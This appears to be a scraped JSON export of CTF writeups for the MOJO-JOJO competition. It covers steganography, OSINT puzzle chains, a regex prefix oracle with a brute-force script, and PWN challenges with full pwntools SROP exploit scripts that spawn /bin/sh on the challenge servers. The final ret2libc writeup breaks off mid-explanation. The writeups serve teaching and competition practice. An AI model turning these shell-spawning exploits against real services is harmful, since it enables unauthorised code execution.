fire.wav:\nMJ=OO1LV_UI_EE3E From rain.wav:\nOOJJ(_3AD0HHHH) Flag Format # The known flag format begins with:\nMOJO-JOJO{ To construct the final flag, we alternate each letter from the decoded messages:\nAlternating Letters: MOJO=JOJO(1_L0V3_AUDI0_HEHEH3HE) Final Flag # This results in the final flag:\nMOJO-JOJO{1_L0V3_AUDI0_HEHEH3HE} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/forensics/nature-symphony/","section":"Writeups","summary":"","title":"Nature Symphony - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Nightmare\nCategory: Misc\nCTF: MOJO-JOJO\nDescription: DO U KNOW WHAT IS SPECIAL ABOUT A NIGHTMARE??ME NEITHER LOL!!\nProblem Description # The challenge presents what appears to be innocent grocery notes in an ASCII art box. However, the actual flag is cleverly hidden using zero-width characters - invisible unicode characters that take up no visual space but exist in the text.\nSolution Approach # Step 1: Recognizing the Attack Vector # The hint in the challenge title \u0026ldquo;Nightmare\u0026rdquo; combined with a file containing seemingly normal text suggests hidden data. Zero-width character encoding is a steganography technique that embeds information using:\nZero-Width Space (U+200B) Zero-Width Non-Joiner (U+200C) Zero-Width Joiner (U+200D) Zero-Width No-Break Space (U+FEFF) These characters are invisible to the human eye but can be detected programmatically.\nStep 2: Extracting the Hidden Message # To decode zero-width encrypted text, we need to:\nCopy the suspicious text from the file Use a tool or script to extract the zero-width characters Convert the binary representation into readable text Step 3: Decoding the Binary # Zero-width characters are typically mapped as follows:\nZero-Width Space (U+200B) = 0 Zero-Width Joiner (U+200D) = 1 Other variations may encode different binary patterns The sequence of these invisible characters forms a binary string that can be decoded into ASCII text containing the flag.\nKey Techniques # Detection Methods # Hexdump/Binary analysis: hexdump -C reveals hidden unicode characters Python script: Extract and decode zero-width characters Online tools: Zero-width character decoders available online In our case we choosed to use an online Zero-width decoder which is stegzero: Final Flag # MOJO-JOJO{c0ngr4t5_y0u_c4n_r34d_1nv151bl3_t3xt_n3rd} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/misc/nightmare/","section":"Writeups","summary":"","title":"Nightmare - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Oracle\nCategory: PWN\nCTF: MOJO-JOJO\nDescription: Two echoes resonate in the silence. No more instruments. No orchestra. Can you conduct the signal symphony and make the void sing?\nConnection: nc mojo-pwn.securinets.tn 9003\nChallenge Overview # The challenge provides a minimal static ELF that prints a short banner and then reads user input. The binary has a classic stack overflow but only a tiny gadget set, so the intended exploitation path is SROP (sigreturn‚Äëoriented programming) to call execve(\u0026quot;/bin/sh\u0026quot;, 0, 0).\nInitial Analysis # Binary Information # $ file main main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped Program Behavior # The void echoes... ECHOES In the silence, two sounds remain Can you make them resonate? The program then performs a single read and returns.\nVulnerability Discovery # 1. Stack Overflow in listen # Disassembly shows that listen() allocates 16 bytes on stack but reads 0x200 bytes from stdin:\n4010e1: sub rsp,0x10 ; 16-byte buffer 4010f4: lea rax,[rbp-0x10] ; buffer 4010f8: mov edx,0x200 ; size = 512 401100: mov edi,0x0 ; fd = stdin 401105: call syscall_read ; read(0, buf, 0x200) This overwrites the saved RBP and return address. The offset to RIP is:\n16 bytes (buffer) 8 bytes (saved RBP) Total: 24 bytes.\n2. Useful Gadgets and Data # The binary is tiny, but it includes the exact pieces we need for SROP:\n/bin/sh at 0x402000 pop rax ; ret at 0x4010ce syscall ; ret at 0x4010d7 Exploitation Strategy (SROP) # We cannot populate rdi, rsi, and rdx with normal ROP because those gadgets do not exist. SROP allows us to restore all registers from a fake signal frame. The plan:\nOverflow the stack to control RIP. Use pop rax ; ret to set rax = 15 (rt_sigreturn). Jump to syscall ; ret to enter the kernel‚Äôs sigreturn handling. The kernel reads a SigreturnFrame from the stack and restores registers. After sigreturn, the restored rip points to syscall ; ret, executing execve(\u0026quot;/bin/sh\u0026quot;, 0, 0). Fake Frame Register State # rax = 59 (execve) rdi = 0x402000 (pointer to /bin/sh) rsi = 0, rdx = 0 (null argv/envp) rip = 0x4010d7 (syscall ; ret) rsp = 0x402000 (safe pivot into .rodata) Exploit Payload Layout # [ padding (24) ] [ pop rax ; ret ] [ 15 ] [ syscall ; ret ] [ SigreturnFrame (execve) ] Exploit Code (solve.py) # #!/usr/bin/env python3 from pwn import * context.clear(arch=\u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.log_level = \u0026#34;info\u0026#34; BIN_PATH = \u0026#34;./main\u0026#34; binary = ELF(BIN_PATH, checksec=False) POP_RAX = 0x4010ce SYSCALL_RET = 0x4010d7 BINSH = 0x402000 OFFSET = 24 def build_payload(): frame = SigreturnFrame() frame.rax = 59 frame.rdi = BINSH frame.rsi = 0 frame.rdx = 0 frame.rip = SYSCALL_RET frame.rsp = BINSH payload = b\u0026#34;A\u0026#34; * OFFSET payload += p64(POP_RAX) payload += p64(15) payload += p64(SYSCALL_RET) payload += bytes(frame) return payload def start(): if args.REMOTE: return remote(\u0026#34;mojo-pwn.securinets.tn\u0026#34;, 9003) return process(BIN_PATH) def main(): io = start() io.recvuntil(b\u0026#34;echoes...\u0026#34;) io.send(build_payload()) io.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() Final Flag # Once the shell is obtained, read /app/flag.txt.\nMOJO-JOJO{tw0_3ch03s_c4n_s1ng_1n_h4rm0ny_sigr3turn_symph0ny} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/binary-exploitation/oracle/","section":"Writeups","summary":"","title":"Oracle - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Oracle Revenge\nCategory: PWN\nCTF: MOJO-JOJO\nDescription: The silence has deepened, and the echoes have turned hostile. The orchestra is gone, leaving only the raw signal in the void. Can you conduct the dissonance and reclaim the silence?\nConnection: nc mojo-pwn.securinets.tn 9004\nInitial Reconnaissance # Binary Analysis # $ file main main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, not stripped Security Protections # $ checksec file main RELRO Stack Canary NX PIE Full RELRO No Canary Found NX enabled PIE Disabled Key observations:\nNo Stack Canary - Buffer overflows are exploitable NX Enabled - Cannot execute shellcode on stack No PIE - Fixed addresses, simplifies exploitation Full RELRO - GOT is read-only, no GOT overwrite possible Running the Binary # $ ./main ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ECHOES Revenge ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê Only signals remain. ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê The void echoes louder... Use this echo to guide your signal: 0x0000000000404020 Speak signal: The binary prints an address (0x404020) which is a hint for exploitation.\nVulnerability Analysis # Disassembly of listen() Function # 0000000000401330 \u0026lt;listen\u0026gt;: 401330: sub rsp,0x28 ; Allocate 40 bytes ... 401389: xor edi,edi 40138b: mov rsi,rsp 40138e: mov edx,0x400 ; Read 1024 bytes! 401393: mov rax,0x0 40139a: syscall ; read(0, rsp, 0x400) 40139c: add rsp,0x28 4013a0: ret Critical Vulnerability: The function allocates only 40 bytes (0x28) on the stack but reads up to 1024 bytes (0x400). This is a classic buffer overflow.\nFinding the Offset # Using a cyclic pattern to determine the exact offset to the return address:\n$ python3 -c \u0026#34;from pwn import *; print(cyclic(100))\u0026#34; | gdb ./main -batch -ex \u0026#39;r\u0026#39; -ex \u0026#39;x/gx $rsp\u0026#39; 0x7fffffffd658: 0x6161616c6161616b $ python3 -c \u0026#34;from pwn import *; print(\u0026#39;Offset:\u0026#39;, cyclic_find(0x6161616c))\u0026#34; Offset: 40 The offset to control RIP is 40 bytes.\nAvailable Gadgets # objdump -d main | grep -A 2 \u0026#34;pop\\|syscall\u0026#34; Limited gadgets available:\n0x401310: pop rax; ret 0x401320: syscall; ret 0x4011bd: pop rbp; ret 0x401257: pop rbx; ret Problem: We only have pop rax for setting registers, but we need to set rdi, rsi, rdx for syscalls!\nKey Memory Regions # 0x404020: scratch_buffer - Writable memory region (size 0x1000) This address is leaked to us at runtime! Exploitation Strategy # Since we lack gadgets to set all necessary registers (rdi, rsi, rdx), we use SROP (Sigreturn Oriented Programming). SROP allows us to set all registers at once using the rt_sigreturn syscall.\nTwo-Stage Attack # Stage 1: Write Second Payload to Known Location # Trigger buffer overflow Use SROP to call read(0, scratch_buffer, 0x100) Set rax = 0 (read syscall) Set rdi = 0 (stdin) Set rsi = scratch_buffer (destination) Set rdx = 0x100 (size) Set rsp = scratch_buffer + 0x18 (new stack location) This reads our second payload into scratch_buffer Stage 2: Execute Shell # Write \u0026ldquo;/bin/sh\\x00\u0026rdquo; + ROP chain to scratch_buffer Use another SROP to call execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL) Set rax = 59 (execve syscall) Set rdi = scratch_buffer (pointer to \u0026ldquo;/bin/sh\u0026rdquo;) Set rsi = 0 (argv = NULL) Set rdx = 0 (envp = NULL) Get shell! SROP Primer # The rt_sigreturn syscall (number 15) restores CPU context from a sigreturn frame on the stack. By crafting this frame, we can set all registers to arbitrary values:\nframe = SigreturnFrame() frame.rax = 59 # Syscall number frame.rdi = addr # First argument frame.rsi = 0 # Second argument frame.rdx = 0 # Third argument frame.rsp = stack # Stack pointer frame.rip = gadget # Instruction pointer Solution # Exploit Code # #!/usr/bin/env python3 from pwn import * # Target configuration HOST = \u0026#39;mojo-pwn.securinets.tn\u0026#39; PORT = 9004 # Binary analysis elf = ELF(\u0026#39;./main\u0026#39;, checksec=False) context.arch = \u0026#39;amd64\u0026#39; context.binary = elf # Gadgets and addresses pop_rax = 0x401310 # pop rax; ret syscall_ret = 0x401320 # syscall; ret scratch_buffer = 0x404020 # writable memory def exploit(): \u0026#34;\u0026#34;\u0026#34;Two-stage SROP exploit\u0026#34;\u0026#34;\u0026#34; p = remote(HOST, PORT) # Receive the leaked address p.recvuntil(b\u0026#39;echo to guide your signal: \u0026#39;) leaked_addr = int(p.recvline().strip(), 16) print(f\u0026#34;[*] Leaked scratch_buffer: {hex(leaked_addr)}\u0026#34;) p.recvuntil(b\u0026#39;Speak signal:\\n\u0026#39;) # Stage 1: Buffer overflow + SROP to call read() offset = 40 payload = b\u0026#39;A\u0026#39; * offset # Trigger rt_sigreturn payload += p64(pop_rax) payload += p64(15) # rt_sigreturn syscall number payload += p64(syscall_ret) # Sigreturn frame for read(0, scratch_buffer, 0x100) frame1 = SigreturnFrame() frame1.rax = 0 # read syscall frame1.rdi = 0 # stdin frame1.rsi = leaked_addr # destination frame1.rdx = 0x100 # size frame1.rsp = leaked_addr + 0x18 # new stack frame1.rip = syscall_ret # execute syscall payload += bytes(frame1) print(f\u0026#34;[*] Sending stage 1: {len(payload)} bytes\u0026#34;) p.send(payload) sleep(0.3) # Stage 2: Write to scratch_buffer # Layout: # [0x00-0x07]: \u0026#34;/bin/sh\\x00\u0026#34; # [0x08-0x17]: padding # [0x18]: ROP chain (return address after syscall; ret) stage2 = b\u0026#39;/bin/sh\\x00\u0026#39; # String at scratch_buffer stage2 += b\u0026#39;B\u0026#39; * 16 # Padding to offset 0x18 # ROP chain continues here (after read returns) stage2 += p64(pop_rax) stage2 += p64(15) # rt_sigreturn again stage2 += p64(syscall_ret) # Sigreturn frame for execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL) frame2 = SigreturnFrame() frame2.rax = 59 # execve syscall frame2.rdi = leaked_addr # \u0026#34;/bin/sh\u0026#34; frame2.rsi = 0 # argv = NULL frame2.rdx = 0 # envp = NULL frame2.rsp = leaked_addr + 0x400 # safe stack frame2.rip = syscall_ret # execute execve stage2 += bytes(frame2) print(f\u0026#34;[*] Sending stage 2: {len(stage2)} bytes\u0026#34;) p.send(stage2) sleep(0.2) # Get shell! p.interactive() if __name__ == \u0026#39;__main__\u0026#39;: exploit() Running the Exploit # $ python3 solve.py [*] Leaked scratch_buffer: 0x404020 [*] Sending stage 1: 312 bytes [*] Sending stage 2: 296 bytes [*] Switching to interactive mode $ ls flag.txt main $ cat flag.txt MOJO-JOJO{St4ck_P1v0t1ng_1nt0_Th3_V0id_Of_Ch40s!} Key Takeaways # SROP is powerful when you lack traditional ROP gadgets - it allows setting all registers with just pop rax; ret and syscall; ret Two-stage exploits can bypass limitations by using one syscall to write a more complex payload Information leaks (like the scratch_buffer address) are crucial for exploiting non-PIE binaries Cyclic patterns are essential for finding exact buffer overflow offsets The challenge name hints at the technique: \u0026ldquo;Oracle\u0026rdquo; (information leak) and \u0026ldquo;Revenge\u0026rdquo; (ECHOES Revenge from the banner) Flag # MOJO-JOJO{St4ck_P1v0t1ng_1nt0_Th3_V0id_Of_Ch40s!} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/binary-exploitation/oracle-revenge/","section":"Writeups","summary":"","title":"Oracle Revenge - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"Osint","type":"tags"},{"content":"During the MOJO-JOJO CTF, I solved OSINT challenges.\nHere I share my approach, mistakes, and how I got the flags. Thanks to the MOJO-JOJO team üêµüß†\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/","section":"Writeups","summary":"","title":"Osint","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"PWN","type":"tags"},{"content":"Challenge Name: Serial Killer 1\nCategory: Osint\nCTF: MOJO-JOJO\nDescription: Your only starting evidence: a photo recovered from a victim‚Äôs phone in Kairouan.\nFlag Format :MOJO-JOJO{City_NN} NN: First and Second of digits the phone Number\nSolution # Initial Analysis # The handout was a pixelated PNG image, suggesting that the information inside was intentionally obscured or encrypted in some way. The pixelation indicated that steganography or image encryption was likely used to hide the flag.\nStep 1: Identifying the Decryption Method # Since the image appeared to be encrypted rather than just visually obscured, I decided to use an image decryption tool. I navigated to Image Online Encrypt/Decrypt to attempt decrypting the image.\nStep 2: Finding the Decryption Key # The decryption tool required a key. Returning to the challenge description, I noticed that only one word was highlighted in bold: Kairouan. This was clearly the hint for the decryption key.\nKey used: Kairouan\nStep 3: Decrypting the Image # After entering \u0026ldquo;Kairouan\u0026rdquo; as the key in the Image Online Encrypt/Decrypt tool, the hidden image was successfully revealed.\nStep 4: Analyzing the Revealed Information # The decrypted image showed:\nA number displayed prominently: 71 An image of a cafe located in Tunis The challenge required finding both the city and a two-digit magic number. Based on the decrypted image:\nCity: Tunis Magic Number: 71 Flag # Combining the location and the two-digit number according to the specified format:\nMOJO-JOJO{Tunis_71} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/serial-killer/serial-killer-1/","section":"Writeups","summary":"","title":"Serial Killer 1 - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Serial Killer 2\nCategory: Osint\nCTF: MOJO-JOJO\nDescription: The caf√© shown in the photo still exists.\nBut records confirm the killer was never physically present there.\nHe was watching‚Ä¶ from somewhere else.\nStudy the image carefully and track the vantage point. Think like an investigator. Every detail matters.\nFlag Format : MOJO-JOJO{City_Name_NN}\nIntroduction # In this challenge, I encountered an image that seemed familiar. Upon closer inspection, it turned out to be the same image I decrypted in a previous challenge, which raised my suspicions and prompted further investigation.\nStep 1: Analyzing the Image Metadata # After opening the handout image, I decided to examine the file‚Äôs metadata using ExifTool. Hiding data in image metadata is a classic CTF technique, often placed in fields like Artist. This led to the discovery of a username that would be crucial for the next steps.\nStep 2: Username Investigation # With the newly discovered username, I turned to whatsmyname, a tool that helps identify platforms associated with a specific username. This search revealed an X account where the user had posted only one picture, captioned ‚ÄúNothing is where it should be.‚Äù\nStep 3: Location Clue # Investigating the post, I found that the photo was taken in Bizerte, specifically at the Bridge of Bizerte. However, this seemed like a rabbit hole, so instead of chasing it, I decided to examine the accounts the user was following for further clues.\nStep 4: Following the Leads # One of the accounts the user followed, Jeffry Millard, looked suspicious. I decided to investigate it more closely. The postal code in Jeffry Millard‚Äôs profile pointed to El Hamma in Gabes, giving us the city.\nStep 5: Finding the Flag # We still needed the two-digit number. After some thinking, I remembered that the first X account had ‚Äú67‚Äù in its username. Given the recent trend of using 67, I tried it ‚Äî and that gave us the flag.\nFinal Flag # The final flag for this challenge is:\nMOJO-JOJO{El_Hamma_67} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/serial-killer/serial-killer-2/","section":"Writeups","summary":"","title":"Serial Killer 2 - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Serial Killer 3\nCategory: Osint\nCTF: MOJO-JOJO\nDescription: Good work. The account you uncovered belongs to a graphic designer involved in several projects.\nStrangely, none of these projects seem easy to trace. Almost as if they were meant to disappear.\nWhere did these works surface? And what do they reveal?\nKeep digging.\nFlag Format: MOJO-JOJO{City_NN}\nChallenge Description # \u0026ldquo;None of these projects seem easy to trace. Almost as if they were meant to disappear.\u0026rdquo;\nThe challenge hints at deleted or hidden content that needs to be uncovered through OSINT techniques.\nSolution # Step 1: Finding Deleted Posts # Reading the description carefully, it was clear that the posts had been deleted. To recover deleted web content, I turned to archive.ph to search for archived snapshots of the target page.\nStep 2: Discovering the GitHub Repository # Success! The archived snapshot revealed a deleted post that contained a link to a GitHub repository.\nStep 3: Decoding the Base64 String # Diving into the repository, I found a .txt file containing a Base64-encoded string.\nUsing CyberChef, I decoded the string and retrieved the missing two-digit number: 22.\nStep 4: Finding the City # We still needed to identify the city. I explored the repository further and checked the commit history.\nIn one of the commits, the city was finally revealed: Bizerte.\nFlag # MOJO-JOJO{Bizerte_22} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/serial-killer/serial-killer-3/","section":"Writeups","summary":"","title":"Serial Killer 3 - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Serial Killer 4\nCategory: Osint\nCTF: MOJO-JOJO\nDescription: Tracking the killer led investigators to another possible location.\nA full search yielded almost nothing ‚Äî except two mysterious files.\nSomewhere inside them lies the next clue.\nYour move.\nSolution # Step 1: Analyzing the Text File - Zero-Width Steganography # Opening the .txt handout, the content appeared corrupted at first glance, which was immediately suspicious.\nThis behavior is characteristic of zero-width characters being used for steganography. To extract the hidden data, we used the Unicode Steganography Decoder.\nResult: We successfully extracted a hidden username from the zero-width characters.\nStep 2: Decoding the Audio File - Morse Code # Next, we examined the .wav handout. Upon listening, it was clearly Morse code.\nWe used a Morse Code Audio Decoder to translate the audio signal:\nDecoded Message:\nI HAVE ONLY 03 SUBSCRIBERS ON MY CHANNEL BROO This revealed two critical pieces of information:\nThe user runs a YouTube channel The channel had 3 subscribers (suggesting the two-digit number is 03) Step 3: Finding the YouTube Channel # Using the username extracted from Step 1, we searched for the corresponding YouTube channel.\nAt the time of the CTF, the channel indeed had 3 subscribers, confirming our findings from the Morse code.\nStep 4: Geolocation via Image OSINT # We proceeded to examine the video content on the channel for the next clue.\nThe video contained an image of a mosque. To geolocate it, we performed image-based OSINT using Yandex AI Images (also known as Yandex Image Search), which is particularly powerful for reverse image searching.\nResult: The mosque was identified as the Oqba Bin Nafi Mosque (also known as the Great Mosque of Kairouan) located in Kairouan, Tunisia.\nFlag Construction # With all the pieces gathered:\nLocation: Kairouan (from the mosque geolocation) Number: 03 (from the Morse code message about subscribers) Final Flag # MOJO-JOJO{Kairouan_03} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/serial-killer/serial-killer-4/","section":"Writeups","summary":"","title":"Serial Killer 4 - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Serial Killer 5\nCategory: Osint\nCTF: MOJO-JOJO\nDescription: What‚Ä¶? This can‚Äôt be right.\nAll trails lead back to where everything started ‚Äî the first location, the first clue.\nBy retracing the suspect‚Äôs movements and searching every possible lead, investigators finally uncovered one last piece of evidence:\nAn encrypted ZIP archive, with nothing but a weird chessboard position, seemingly arranged without logic or rules.\nBut this board is no random game ‚Äî it leads the final message.\nDecrypt the archive. Analyze the board. Only then will you be able to uncover the real identity of the killer.\nFlag Format: MOJO-JOJO{Killer_Identity}\nSolution # Step 1: Identify the Password Length # Returning to Serial Killer 4, The YouTube video titled \u0026ldquo;the password length is 9\u0026rdquo; provided the critical first clue ‚Äî the ZIP archive was password-protected with a 9-character password.\nStep 2: Decode the Image Handout # Using CyberChef, we decoded the image handout by interpreting it as binary data where:\n0 = White pixel 1 = Black pixel This binary-to-image conversion revealed the digit: 6\nStep 3: Combine Previous Flags # From earlier stages of the investigation, we had collected 4 flags containing 8 digits in total. Combining these with the newly decoded digit (6), we constructed the complete 9-character password:\n716722036 Source Contribution Serial Killer 1 71 Serial Killer 2 67 Serial Killer 3 22 Serial Killer 4 03 Binary Decode 6 Total 716722036 Step 4: Extract the ZIP Archive # Using the password 716722036, we extracted the contents of the encrypted ZIP archive.\nunzip -P 716722036 handout.zip Step 5: Analyze the Extracted Picture # The ZIP archive contained a picture file. Upon examination of the image, it revealed the hidden message containing the killer\u0026rsquo;s identity.\nFinal Flag # Reading the decrypted image yielded the final flag:\nMOJO-JOJO{Saffe7_Lboudreya} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/serial-killer/serial-killer-5/","section":"Writeups","summary":"","title":"Serial Killer 5 - CTF Writeup","type":"writeups"},{"content":"Description: A series of murders across different cities share one chilling detail: every victim had interacted online with the same anonymous boy shortly before their death.\nThe police investigation stalled. Leads went cold.\nNow, you step in as an independent investigator. Every clue you uncover brings you closer to revealing the killer‚Äôs identity.\nIn each task, your objective is to determine:\nthe location\na two-digit magic number linked to it.\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/serial-killer/","section":"Writeups","summary":"","title":"Serial Killer Series - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Silent Hill\nCategory: Misc\nCTF: MOJO-JOJO\nDescription: Some words return instantly; others linger, lost in the complexity of the abyss.\nConnection: nc 4.233.210.175 9011\nInitial Analysis # When connecting to the server, it accepts input and returns a response indicating whether there\u0026rsquo;s a match along with timing information:\n$ nc 4.233.210.175 9011 test Result: No match Time: 0.000082s The hint about \u0026ldquo;words lingering in complexity\u0026rdquo; initially suggested a ReDoS (Regular Expression Denial of Service) attack, where certain patterns cause catastrophic backtracking in vulnerable regex engines. However, the actual mechanism turned out to be simpler.\nKey Insight # After testing with the hint that the flag starts with MOJO-JOJO{, we discovered that the server implements a prefix-matching oracle:\nMOJO-JOJO{ Result: Matched Time: 0.000064s The server returns \u0026ldquo;Matched\u0026rdquo; when the input is a valid prefix of the flag, and \u0026ldquo;No match\u0026rdquo; otherwise. This allows us to extract the flag character by character.\nSolution Approach # Start with the known prefix MOJO-JOJO{ For each position, try all possible characters (letters, digits, special characters) When a character results in \u0026ldquo;Matched\u0026rdquo;, append it to our known prefix Repeat until we find the closing brace } Exploitation Script # #!/usr/bin/env python3 import socket import time import string def test_input(s, text): \u0026#34;\u0026#34;\u0026#34;Send input to server and get response\u0026#34;\u0026#34;\u0026#34; s.sendall((text + \u0026#39;\\n\u0026#39;).encode()) # Receive response response = b\u0026#39;\u0026#39; s.settimeout(2) try: while True: chunk = s.recv(4096) if not chunk: break response += chunk if b\u0026#39;Time:\u0026#39; in response: break except socket.timeout: pass return response.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) def extract_time(response): \u0026#34;\u0026#34;\u0026#34;Extract timing from response\u0026#34;\u0026#34;\u0026#34; if \u0026#39;Time:\u0026#39; in response: try: time_str = response.split(\u0026#39;Time:\u0026#39;)[1].strip().rstrip(\u0026#39;s\u0026#39;) return float(time_str) except: return 0 return 0 def main(): host = \u0026#39;4.233.210.175\u0026#39; port = 9011 # Start with known prefix known = \u0026#34;MOJO-JOJO{\u0026#34; # Character set to try charset = string.ascii_letters + string.digits + \u0026#34;_-{}!@#$%^\u0026amp;*()[]\u0026#34; print(f\u0026#34;Starting with: {known}\u0026#34;) while True: best_char = None best_time = 0 results = [] # Try each character for char in charset: test_str = known + char try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) response = test_input(s, test_str) s.close() timing = extract_time(response) matched = \u0026#34;Matched\u0026#34; in response results.append((char, timing, matched, response.strip())) if matched: print(f\u0026#34; [MATCH] \u0026#39;{char}\u0026#39; -\u0026gt; {response.strip()}\u0026#34;) best_char = char break time.sleep(0.05) except Exception as e: print(f\u0026#34;Error with {repr(test_str)}: {e}\u0026#34;) # Sort by timing to see which took longest results.sort(key=lambda x: x[1], reverse=True) print(f\u0026#34;\\nTop 5 by timing:\u0026#34;) for char, timing, matched, resp in results[:5]: print(f\u0026#34; \u0026#39;{char}\u0026#39;: {timing:.6f}s - {resp}\u0026#34;) if best_char: known += best_char print(f\u0026#34;\\n‚úì Found: {known}\\n\u0026#34;) # Check if we found the closing brace if best_char == \u0026#39;}\u0026#39;: print(f\u0026#34;\\n FLAG FOUND: {known}\u0026#34;) break else: # If no match, pick the one with highest time (ReDoS approach) best_char = results[0][0] known += best_char print(f\u0026#34;\\n? Guessing based on timing: {known}\\n\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() Execution # Running the script automatically extracts the flag character by character:\nStarting with: MOJO-JOJO{ [MATCH] \u0026#39;t\u0026#39; -\u0026gt; Result: Matched ‚úì Found: MOJO-JOJO{t [MATCH] \u0026#39;h\u0026#39; -\u0026gt; Result: Matched ‚úì Found: MOJO-JOJO{th [MATCH] \u0026#39;3\u0026#39; -\u0026gt; Result: Matched ‚úì Found: MOJO-JOJO{th3 ... [MATCH] \u0026#39;}\u0026#39; -\u0026gt; Result: Matched ‚úì Found: MOJO-JOJO{th3_r3g3x_0r4cl3_1s_sh4rp_4nd_d4ng3r0us} FLAG FOUND: MOJO-JOJO{th3_r3g3x_0r4cl3_1s_sh4rp_4nd_d4ng3r0us} Flag # MOJO-JOJO{th3_r3g3x_0r4cl3_1s_sh4rp_4nd_d4ng3r0us} Conclusion # This challenge demonstrated a regex oracle attack where a vulnerable implementation leaks information about valid prefixes. The flag message itself hints at the vulnerability: \u0026ldquo;the regex oracle is sharp and dangerous\u0026rdquo; - a reference to how regex pattern matching can inadvertently leak information when used for validation without proper safeguards.\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/misc/silent-hill/","section":"Writeups","summary":"","title":"Silent Hill - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"Challenge Name: The Archive\u0026rsquo;s Whisper\nCategory: PWN\nCTF: MOJO-JOJO\nDescription: A quiet archive awaits your words, but its echo hides something unusual beneath the surface.\nConnection: nc mojo-pwn.securinets.tn 9002\nInitial Reconnaissance # First, let\u0026rsquo;s examine the provided binary:\n$ file main main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped $ checksec main [*] \u0026#39;/path/to/main\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fc000) Key observations:\nNo PIE: Binary addresses are fixed, making ROP chain construction easier No canary: Stack buffer overflows won\u0026rsquo;t be detected NX enabled: Stack is non-executable, so we can\u0026rsquo;t execute shellcode directly Not stripped: Function names are preserved, helpful for analysis Binary Analysis # Main Function # 00000000004011e0 \u0026lt;main\u0026gt;: 4011e0: push rbp 4011e1: mov rbp,rsp 4011e4: mov eax,0x0 4011e9: call 40114f \u0026lt;setup\u0026gt; ; Setup I/O buffering 4011ee: mov eax,0x0 4011f3: call 4011b0 \u0026lt;vuln\u0026gt; ; Vulnerable function 4011f8: mov eax,0x0 4011fd: pop rbp 4011fe: ret Vulnerable Function # 00000000004011b0 \u0026lt;vuln\u0026gt;: 4011b0: push rbp 4011b1: mov rbp,rsp 4011b4: sub rsp,0x40 ; Allocate 64 bytes 4011b8: lea rax,[rip+0xe49] 4011bf: mov rdi,rax 4011c2: call 401030 \u0026lt;puts@plt\u0026gt; ; Print message 4011c7: lea rax,[rbp-0x40] ; Buffer at rbp-0x40 4011cb: mov edx,0xc8 ; Read 200 bytes! 4011d0: mov rsi,rax 4011d3: mov edi,0x0 4011d8: call 401040 \u0026lt;read@plt\u0026gt; 4011dd: nop 4011de: leave 4011df: ret The Vulnerability: Classic buffer overflow!\nBuffer size: 0x40 (64 bytes) Read size: 0xc8 (200 bytes) Overflow: 200 - 64 = 136 bytes of controllable data beyond the buffer Useless Gadget (Not So Useless!) # 0000000000401146 \u0026lt;useless_gadget\u0026gt;: 401146: push rbp 401147: mov rbp,rsp 40114a: pop rdi ; pop rdi; ret gadget! 40114b: ret This gives us a crucial ROP gadget: pop rdi; ret at address 0x40114a.\nExploitation Strategy # Since NX is enabled, we can\u0026rsquo;t execute shellcode on the stack. We\u0026rsquo;ll use a ret2libc attack:\nTwo-Stage Attack # Stage 1: Leak libc 